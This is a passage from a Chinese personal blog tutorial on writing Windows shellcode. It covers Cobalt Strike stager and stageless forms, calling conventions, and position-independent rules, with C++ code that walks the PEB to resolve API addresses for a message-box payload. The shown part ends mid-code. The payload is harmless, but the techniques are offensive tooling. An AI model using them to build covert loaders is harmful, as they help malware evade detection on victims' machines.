

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
  <link rel="icon" href="/img/candy.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#1b1b26">
  <meta name="author" content="Candy">
  <meta name="keywords" content="">
  
    <meta name="description" content="以前完全没有接触过该领域的知识和内容，可以说目前是一个从零开始学习的状态。汇编能看懂，但是不会写。学习目标是能够实现自定义的 shellcode，编写自己想要的功能。let’s go! 学习方式主要是参考 one day 师傅的三篇文章（放参考链接啦），本文主要是记录一下自己的学习内容，方便后续查阅，学习的话建议直接看 one day 师傅的文章。 一、基础概念shellcode 是一段精心编写的">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows系统shellcode开发">
<meta property="og:url" content="http://candyb0x.github.io/2025/10/15/Windows%E7%B3%BB%E7%BB%9Fshellcode%E5%BC%80%E5%8F%91/index.html">
<meta property="og:site_name" content="Welcome Candy Box">
<meta property="og:description" content="以前完全没有接触过该领域的知识和内容，可以说目前是一个从零开始学习的状态。汇编能看懂，但是不会写。学习目标是能够实现自定义的 shellcode，编写自己想要的功能。let’s go! 学习方式主要是参考 one day 师傅的三篇文章（放参考链接啦），本文主要是记录一下自己的学习内容，方便后续查阅，学习的话建议直接看 one day 师傅的文章。 一、基础概念shellcode 是一段精心编写的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760270977347-c022228f-dfca-43c6-b98f-a04ede3d1916.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760271003805-747f7651-ac29-4bef-80ca-83347f560fc8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760271046964-66ee744f-efeb-42e2-b434-4bd46b3ae6d4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760271069949-ff246143-0934-4ad2-a794-96f83e16834e.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760278211646-8157e584-aa37-421e-b312-1efd151980c4.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276212372-55dd68cf-aa13-40d0-a76e-3629c2565054.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276246118-3438a38a-718b-4910-9f08-5ce79df17b50.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760275817263-6e26f9cc-9f9c-4fd6-83f7-62981679fe76.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276264031-47cae63c-24cf-42c9-b68a-b9c40d9eae68.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276371171-2dcebcf4-68fe-4860-92eb-36603a7907e4.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760349252571-ede6040c-a6f7-439f-a839-17c621c7e29e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760354516033-20dab95e-3a3e-442c-83cc-591c7024543c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760356651512-45108685-23c4-4d33-91c3-154375a861d0.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760363869544-213f70d0-3256-4dda-aa67-f64199e93e7d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760454150393-4f3651da-8b8c-423b-990b-2a9c9eb60fdc.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760512009796-ed17cf5e-c314-4737-8a50-d7b2899ada07.png">
<meta property="article:published_time" content="2025-10-15T07:08:56.000Z">
<meta property="article:modified_time" content="2025-12-24T13:47:16.895Z">
<meta property="article:author" content="Candy">
<meta property="article:tag" content="shellcode">
<meta property="article:tag" content="Windows编程">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760270977347-c022228f-dfca-43c6-b98f-a04ede3d1916.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Windows系统shellcode开发 - Welcome Candy Box</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Candy</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/essay/" target="_self">
                <i class="iconfont icon-note"></i>
                <span>随笔</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Windows系统shellcode开发"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Candy
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-15 15:08" pubdate>
          2025年10月15日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          138 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Windows系统shellcode开发</h1>
            
            
              <div class="markdown-body">
                
                <p>以前完全没有接触过该领域的知识和内容，可以说目前是一个从零开始学习的状态。汇编能看懂，但是不会写。学习目标是能够实现自定义的 shellcode，编写自己想要的功能。let’s go!</p>
<p>学习方式主要是参考 one day 师傅的三篇文章（放参考链接啦），本文主要是记录一下自己的学习内容，方便后续查阅，学习的话建议直接看 one day 师傅的文章。</p>
<h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><p><strong>shellcode</strong> 是一段精心编写的机器代码，它具有<strong>位置无关、紧凑高效、直接在CPU上执行，无需编译</strong>等属性。在攻防对抗中，shellcode常用于<strong>网络操作</strong>、<strong>权限提升</strong>、<strong>文件操作</strong>等。</p>
<p>在 CobaltStrike 中生成 shellcode 的时候通常会让我们选择以下的两种形式的 shellcode，分别为 stager(分阶段)和 stagerless(无阶段)两种形式。以下是对两种 shellcode 的粗糙理解。</p>
<p><strong>stager shellcode：</strong>真正的 shellcode（执行恶意指令） 并不包含 shellcode 中，而是通过互联网下载或从外部文件加载进来；</p>
<p><strong>stagerless shellcode</strong>：真正的 shellcode（执行恶意指令） 包含在 shellcode 中，无需从互联网或外部加载任何内容；</p>
<p>调用约定定义了函数调用时 <strong>参数传递顺序</strong>、<strong>堆栈清理责任</strong>（调用者或被调用者）以及 <strong>函数名修饰规则</strong>。<code>WINAPI</code> 是 Windows 开发中的一个宏定义，<strong>用于指定函数使用</strong> <code>__stdcall</code> <strong>调用约定</strong>。</p>
<table>
<thead>
<tr>
<th>调用约定</th>
<th>参数顺序</th>
<th>堆栈清理者</th>
<th>典型应用场景</th>
<th>变参支持</th>
</tr>
</thead>
<tbody><tr>
<td><code>__stdcall</code></td>
<td>右→左</td>
<td>被调用者</td>
<td>Windows API、COM接口</td>
<td>否</td>
</tr>
<tr>
<td><code>__cdecl</code></td>
<td>右→左</td>
<td>调用者</td>
<td>C&#x2F;C++默认、可变参数函数</td>
<td>是</td>
</tr>
<tr>
<td><code>__fastcall</code></td>
<td>右→左</td>
<td>被调用者</td>
<td>部分寄存器传参优化场景</td>
<td>否</td>
</tr>
</tbody></table>
<h1 id="二、shellcode-编写注意事项"><a href="#二、shellcode-编写注意事项" class="headerlink" title="二、shellcode 编写注意事项"></a>二、shellcode 编写注意事项</h1><p>pe文件的加载流程</p>
<ol>
<li>首先将PE文件按照内存结构重写映射到内存中</li>
<li>修复导入表</li>
<li>修复重定向表</li>
<li>TLS（线程本地存储）初始化</li>
<li>修改C++异常、修复导入延迟表等</li>
<li>执行入口点</li>
</ol>
<p>我们在编写位置无关的shellcode时，就要注意下面的事项</p>
<ol>
<li><strong>.rdata节中的全局变量或常量是不能用</strong>：因为我们的shellcode并不是exe文件，没有完成重定位这个操作。如果我们使用类似 <code>CHAR VirtualAlloc[] = &quot;VirtualAlloc&quot;;</code> 的常量字符串是不允许的。但话也不能说的这么绝对，如果能保证文件对齐和内存对齐相同，也就可以带上.rdata节的数据，但我感觉太麻烦了。 </li>
<li><strong>不能使用导入表</strong>：如果需要用到Windows的API，就需要通过PEB来动态获取或者可以先用PEB获取 <code>LoadLibrary+GetProcAddress</code> 函数的地址，然后用这两个的组合来获取需要的函数的地址。 </li>
<li>不使用C++异常、不使用导入延迟表</li>
<li>编译后提取 <code>.text</code> 节作为我们的shellcode。</li>
</ol>
<h1 id="三、环境配置"><a href="#三、环境配置" class="headerlink" title="三、环境配置"></a>三、环境配置</h1><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760270977347-c022228f-dfca-43c6-b98f-a04ede3d1916.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760271003805-747f7651-ac29-4bef-80ca-83347f560fc8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760271046964-66ee744f-efeb-42e2-b434-4bd46b3ae6d4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760271069949-ff246143-0934-4ad2-a794-96f83e16834e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760278211646-8157e584-aa37-421e-b312-1efd151980c4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h1 id="四、弹窗-shellcode"><a href="#四、弹窗-shellcode" class="headerlink" title="四、弹窗 shellcode"></a>四、弹窗 shellcode</h1><h2 id="4-1-cpp-获取弹窗-shellcode"><a href="#4-1-cpp-获取弹窗-shellcode" class="headerlink" title="4.1 cpp 获取弹窗 shellcode"></a>4.1 cpp 获取弹窗 shellcode</h2><p>想要直接通过<code>.text</code>节获取到 shellcode 执行，那么得先保证我们的变量不会保存在<code>.rdata</code>节中，通过以下方式定义的变量就会保存在<code>.text</code>节中，而不是在<code>.rdata</code>中；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">CHAR messageBoxA[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>CHAR loadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>CHAR getProcAddress[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>WCHAR kernel32[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">L&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>CHAR User32[] = &#123; <span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure>

<p>除此之外，需要保证不需要修复导入表也不适用导入表，因此只能通过 peb 获取相应的函数指针进行调用；</p>
<p>大致的步骤如下</p>
<ol>
<li><strong>获取PEB的地址</strong>：从gs&#x2F;fs寄存器中获取PEB的地址 </li>
<li><strong>遍历加载的模块列表</strong>：从PEB中访问 <code>Ldr</code> 成员，获取 <code>PEB_LDR_DATA</code> 结构。遍历InMemoryOrderModuleList链表，获取每个模块的LDR_DATA_TABLE_ENTRY。 </li>
<li><strong>查找目标DLL（如kernel32.dll）</strong>：比较每个模块的BaseDllName与目标DLL名称（不区分大小写） </li>
<li><strong>解析目标DLL的导出表</strong>：从DLL基地址获取PE头，定位导出表。遍历导出表中的函数名称，找到目标函数并计算其地址。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// sc1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><br><span class="hljs-comment">// 自定义宽字符转小写（简化版 Unicode 支持）</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span> <span class="hljs-title">my_towlower</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> c)</span> </span>&#123;<br>    <span class="hljs-comment">// 基础拉丁字母（A-Z）直接转换</span><br>    <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> c + <span class="hljs-number">32</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-comment">// 不区分大小写的宽字符串比较函数（不修改原始字符串）</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringW</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str1, <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str2)</span> </span>&#123;<br>    <span class="hljs-comment">// 空指针检查</span><br>    <span class="hljs-keyword">if</span> (str1 == <span class="hljs-literal">NULL</span> || str2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 动态转换并比较字符，无需修改原始字符串</span><br>    <span class="hljs-keyword">while</span> (str1[i] != <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] != <span class="hljs-string">L&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-type">wchar_t</span> c1 = <span class="hljs-built_in">my_towlower</span>(str1[i]);<br>        <span class="hljs-type">wchar_t</span> c2 = <span class="hljs-built_in">my_towlower</span>(str2[i]);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">L&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ASCII字符串比较函数</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringA</span><span class="hljs-params">(CHAR str1[], CHAR str2[])</span> </span>&#123;<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (str1[i] &amp;&amp; str2[i]) &#123;<br><br>        <span class="hljs-keyword">if</span> (str1[i] != str2[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">&#x27;\0&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-comment">// 提取 DLL 名称的函数</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span>* <span class="hljs-title">ExtractDllName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* fullDllName)</span> </span>&#123;<br>    <span class="hljs-type">wchar_t</span>* fileName = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">wchar_t</span>* temp = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br><br>    <span class="hljs-comment">// 遍历并找到最后一个 &#x27;\\&#x27;，获取文件名部分</span><br>    <span class="hljs-keyword">while</span> (*temp) &#123;<br>        <span class="hljs-keyword">if</span> (*temp == <span class="hljs-string">L&#x27;\\&#x27;</span>) &#123;<br>            fileName = temp + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新文件名的位置</span><br>        &#125;<br>        temp++;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有找到 &#x27;\\&#x27;，则认为整个字符串就是文件名</span><br>    <span class="hljs-keyword">if</span> (!fileName) &#123;<br>        fileName = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fileName;<br>&#125;<br><br><br><span class="hljs-function">FARPROC <span class="hljs-title">GetApiAddressByName</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* TargertDllName, <span class="hljs-type">char</span>* ApiName)</span> </span>&#123;<br><br>    <span class="hljs-comment">// 从获取 PEB 地址</span><br>    PPEB pPEB = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-comment">// 获取 PEB.Ldr</span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br><br>    <span class="hljs-comment">// 遍历模块列表</span><br>    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink;<br>    <span class="hljs-keyword">while</span> (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br><br>        <span 